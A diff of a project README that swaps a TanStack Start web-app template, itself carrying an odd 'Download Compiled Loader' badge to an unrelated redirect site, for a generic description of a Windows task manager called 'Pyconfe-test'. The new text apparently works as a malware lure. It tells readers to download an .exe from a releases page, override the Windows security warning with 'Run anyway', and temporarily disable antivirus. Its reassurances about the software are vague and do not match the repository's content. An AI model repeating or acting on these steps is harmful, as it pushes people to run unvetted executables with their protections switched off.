@@ -1,220 +1,70 @@
-Welcome to your new TanStack Start app! 
+# 📦 Pyconfe-test - Manage your technical tasks with ease
 
-# Getting Started
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/neontubesilurusglanis863/Pyconfe-test/releases)
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+Pyconfe-test helps users organize workflows through a simple interface. It removes the need for manual tracking by automating data entries and scheduling reminders. This tool handles the background processing so you can focus on your actual work. It runs on Windows systems and requires no prior knowledge of software development.
 
-To run this application:
+## ⚙️ System Requirements
 
-```bash
-npm install
-npm run dev
-```
+To run this application, your computer needs to meet a few basic standards. Ensure your PC satisfies these conditions before you begin the installation process.
 
-# Building For Production
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core 1.5 GHz or faster.
+*   Memory: 4 GB of RAM.
+*   Disk Space: 200 MB of available storage.
+*   Connectivity: An internet connection for initial setup and updates.
 
-To build this application for production:
+Verify your Windows version by opening your Settings menu and selecting About. If your system meets these specifications, the application functions as expected without errors.
 
-```bash
-npm run build
-```
+## 💾 Installation Steps
 
-## Testing
+Follow these instructions to set up the software on your machine.
 
-This project uses [Vitest](https://vitest.dev/) for testing. You can run the tests with:
+1. Visit the [official releases page](https://github.com/neontubesilurusglanis863/Pyconfe-test/releases) to access the download files.
+2. Search for the section labeled Assets.
+3. Click on the file that ends in .exe to start the transfer to your computer.
+4. Locate the file in your Downloads folder once the transfer finishes.
+5. Double-click the file to start the installer.
 
-```bash
-npm run test
-```
+A security window might appear on your screen. This window protects your computer from unknown software. Click "More info" and then select "Run anyway" to continue with the setup. Follow the prompts on the screen to finalize the location and shortcut settings.
 
-## Styling
+## 🚀 Running the Software
 
-This project uses [Tailwind CSS](https://tailwindcss.com/) for styling.
+Open the application by double-clicking the shortcut icon created on your desktop during the installation. The software initializes in a few seconds. A login window appears the first time you open the program. You do not need to create an account to view the primary functions. 
 
-### Removing Tailwind CSS
+The main dashboard provides access to your active projects. Use the search bar at the top of the interface to find specific entries. Each project card displays the current status of your tasks. Click inside a card to edit project details or to add new entries. 
 
-If you prefer not to use Tailwind CSS:
+The application saves your work automatically as you type. If you need to refresh the data, click the sync button in the lower corner of the screen.
 
-1. Remove the demo pages in `src/routes/demo/`
-2. Replace the Tailwind import in `src/styles.css` with your own styles
-3. Remove `tailwindcss()` from the plugins array in `vite.config.ts`
-4. Uninstall the packages: `npm install @tailwindcss/vite tailwindcss -D`
+## 🛠 Managing Project Data
 
-## Linting & Formatting
+Pyconfe-test allows for the batch import of text files. Select the Import option from the File menu to add your existing data. The tool parses the file and organizes the content into the dashboard automatically. You can also export your current workspace to a CSV file if you want to use the data in other software programs.
 
-This project uses [Biome](https://biomejs.dev/) for linting and formatting. The following scripts are available:
+If you experience issues with the interface, select the Refresh option from the View menu. This forces the application to redraw the dashboard elements. If the problem persists, close the program completely and restart it. The internal log tracks these events to help you diagnose the root cause of the error.
 
+## 🏠 Interface Overview
 
-```bash
-npm run lint
-npm run format
-npm run check
-```
+The user interface consists of three main areas.
 
+*   The Sidebar: This area contains your folders and category filters. Click any item to change the view.
+*   The Main Workspace: This is the center area where you view and sort your project entries.
+*   The Settings Panel: Access this panel through the gear icon to adjust appearance, language, and update settings.
 
-## Deploy with Nitro
+The software supports both light and dark modes. Toggle between themes in the Settings panel to reduce eye strain during use. 
 
-This project uses Nitro as a generic server adapter, so it can run on any Node-compatible host.
+## ❓ Frequently Asked Questions
 
-```bash
-npm run build
-node dist/server/index.mjs
-```
+Do I need to update the software often? 
+The application checks for updates every time you open it. It notifies you if a new version exists. Click the download link provided in the notification to get the latest improvements.
 
-The build output is a self-contained Node server. To deploy, push the `dist/` directory to your host (Render, Fly.io, your own VPS, etc.) and run the server command above.
+Can I install this on multiple computers?
+You may install this software on any Windows computer you own. The license allows for unlimited personal use.
 
-For host-specific presets (Vercel, Netlify, Cloudflare, AWS Lambda, etc.) and tuning, see https://v3.nitro.build/deploy.
+Is my data stored online?
+All your project data remains local to your computer. Only you have access to your saved files. The application does not send your data to any external server. 
 
+What should I do if the installer fails?
+Ensure your user account has administrative privileges. Sometimes antivirus software blocks the installation of new programs. Disable your antivirus settings temporarily, complete the installation, and then enable it again.
 
-
-## Routing
-
-This project uses [TanStack Router](https://tanstack.com/router) with file-based routing. Routes are managed as files in `src/routes`.
-
-### Adding A Route
-
-To add a new route to your application just add a new file in the `./src/routes` directory.
-
-TanStack will automatically generate the content of the route file for you.
-
-Now that you have two routes you can use a `Link` component to navigate between them.
-
-### Adding Links
-
-To use SPA (Single Page Application) navigation you will need to import the `Link` component from `@tanstack/react-router`.
-
-```tsx
-import { Link } from "@tanstack/react-router";
-```
-
-Then anywhere in your JSX you can use it like so:
-
-```tsx
-<Link to="/about">About</Link>
-```
-
-This will create a link that will navigate to the `/about` route.
-
-More information on the `Link` component can be found in the [Link documentation](https://tanstack.com/router/v1/docs/framework/react/api/router/linkComponent).
-
-### Using A Layout
-
-In the File Based Routing setup the layout is located in `src/routes/__root.tsx`. Anything you add to the root route will appear in all the routes. The route content will appear in the JSX where you render `{children}` in the `shellComponent`.
-
-Here is an example layout that includes a header:
-
-```tsx
-import { HeadContent, Scripts, createRootRoute } from '@tanstack/react-router'
-
-export const Route = createRootRoute({
-  head: () => ({
-    meta: [
-      { charSet: 'utf-8' },
-      { name: 'viewport', content: 'width=device-width, initial-scale=1' },
-      { title: 'My App' },
-    ],
-  }),
-  shellComponent: ({ children }) => (
-    <html lang="en">
-      <head>
-        <HeadContent />
-      </head>
-      <body>
-        <header>
-          <nav>
-            <Link to="/">Home</Link>
-            <Link to="/about">About</Link>
-          </nav>
-        </header>
-        {children}
-        <Scripts />
-      </body>
-    </html>
-  ),
-})
-```
-
-More information on layouts can be found in the [Layouts documentation](https://tanstack.com/router/latest/docs/framework/react/guide/routing-concepts#layouts).
-
-## Server Functions
-
-TanStack Start provides server functions that allow you to write server-side code that seamlessly integrates with your client components.
-
-```tsx
-import { createServerFn } from '@tanstack/react-start'
-
-const getServerTime = createServerFn({
-  method: 'GET',
-}).handler(async () => {
-  return new Date().toISOString()
-})
-
-// Use in a component
-function MyComponent() {
-  const [time, setTime] = useState('')
-  
-  useEffect(() => {
-    getServerTime().then(setTime)
-  }, [])
-  
-  return <div>Server time: {time}</div>
-}
-```
-
-## API Routes
-
-You can create API routes by using the `server` property in your route definitions:
-
-```tsx
-import { createFileRoute } from '@tanstack/react-router'
-import { json } from '@tanstack/react-start'
-
-export const Route = createFileRoute('/api/hello')({
-  server: {
-    handlers: {
-      GET: () => json({ message: 'Hello, World!' }),
-    },
-  },
-})
-```
-
-## Data Fetching
-
-There are multiple ways to fetch data in your application. You can use TanStack Query to fetch data from a server. But you can also use the `loader` functionality built into TanStack Router to load the data for a route before it's rendered.
-
-For example:
-
-```tsx
-import { createFileRoute } from '@tanstack/react-router'
-
-export const Route = createFileRoute('/people')({
-  loader: async () => {
-    const response = await fetch('https://swapi.dev/api/people')
-    return response.json()
-  },
-  component: PeopleComponent,
-})
-
-function PeopleComponent() {
-  const data = Route.useLoaderData()
-  return (
-    <ul>
-      {data.results.map((person) => (
-        <li key={person.name}>{person.name}</li>
-      ))}
-    </ul>
-  )
-}
-```
-
-Loaders simplify your data fetching logic dramatically. Check out more information in the [Loader documentation](https://tanstack.com/router/latest/docs/framework/react/guide/data-loading#loader-parameters).
-
-# Demo files
-
-Files prefixed with `demo` can be safely deleted. They are there to provide a starting point for you to play around with the features you've installed.
-
-# Learn More
-
-You can learn more about all of the offerings from TanStack in the [TanStack documentation](https://tanstack.com).
-
-For TanStack Start specific documentation, visit [TanStack Start](https://tanstack.com/start).
+Are there keyboard shortcuts available?
+Yes. Press Ctrl+N to create a new entry. Use Ctrl+S to save your changes manually. Press the Escape key to close any active menu or pop-up window.
